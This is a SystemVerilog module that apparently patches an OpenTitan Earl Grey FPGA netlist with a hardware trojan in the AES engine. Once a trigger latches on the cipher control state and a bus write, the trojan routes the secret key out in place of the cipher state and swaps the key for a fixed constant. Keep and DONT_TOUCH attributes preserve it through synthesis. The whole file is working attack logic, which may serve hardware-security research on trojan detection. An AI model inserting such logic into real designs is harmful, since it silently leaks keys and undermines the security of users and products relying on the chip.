module top(
    );

logic trojan_active;
logic trojan_active_reg_d;

// top_earlgrey/u_aes/u_reg/u_data_in_%1%3..0%/q_reg[%2%31..0%] : Q -> top_earlgrey/u_aes/u_aes_core/u_aes_cipher_core/u_aes_cipher_control/state_q.*
(* keep = "true" *) logic state_init_i [127:0];
logic state_init_o [127:0];

// top_earlgrey/u_aes/u_aes_core/key_init_q_reg[0][%1%3..0%][%2%31..0%] : Q -> top_earlgrey/u_aes/u_aes_core/u_aes_cipher_core/u_aes_cipher_control/key_full_q.*
(* keep = "true" *) logic key_init_i [127:0];
logic key_init_o [127:0];

// top_earlgrey/u_xbar_main/u_sm1_27/u_devicefifo/reqfifo/ctrl_we_q_i_1 : O
(* keep = "true" *) logic ctrl_we_i;

// top_earlgrey/u_aes/u_aes_core/u_aes_cipher_core/u_aes_cipher_control/FSM_sequential_aes_cipher_ctrl_cs_reg[%2..0%] : Q
(* keep = "true" *) logic aes_cipher_ctrl_cs_i[2:0];

// top_earlgrey/u_clkmgr/u_clk_main_aes_cg/gen_xilinx.u_impl_xilinx/u_bufgce : O
logic aes_clk_i;

// state mux: outputs key if trojan is active, otherwise state 
(* DONT_TOUCH = "yes" *) LUT6 #(
  .INIT(64'hD8D8D8D8D8D8D8D8)
) trj_state_mux_intercept[127:0] (
  .I2(state_init_i),
  .I1(key_init_i),
  .I0(trojan_active),
  .O(state_init_o)
);

// key mux: outputs fixed key if trojan is active, otherwise key
(* DONT_TOUCH = "yes" *) LUT6 #(
  .INIT(64'hD8D8D8D8D8D8D8D8)
) trj_key_full_mux_intercept[127:0] (
  .I2(key_init_i),
  .I1(128'hFFEEDDCCBBAA99887766554433221100),
  .I0(trojan_active),
  .O(key_init_o)
);

(* DONT_TOUCH = "yes" *) LUT6 #(
  .INIT(64'hFFFFAA2AFFFFAA2A)
) trj_active_logic (
  .I4(ctrl_we_i),
  .I3(aes_cipher_ctrl_cs_i[2]),
  .I2(aes_cipher_ctrl_cs_i[1]),
  .I1(aes_cipher_ctrl_cs_i[0]),
  .I0(trojan_active),
  .O(trojan_active_reg_d)
);

(* DONT_TOUCH = "yes" *) FDRE #(
  .INIT(1'b0)
) trj_active_reg (
  .C(aes_clk_i),
  .CE(1'b1),
  .D(trojan_active_reg_d),
  .Q(trojan_active),
  .R(1'b0)
);

endmodule
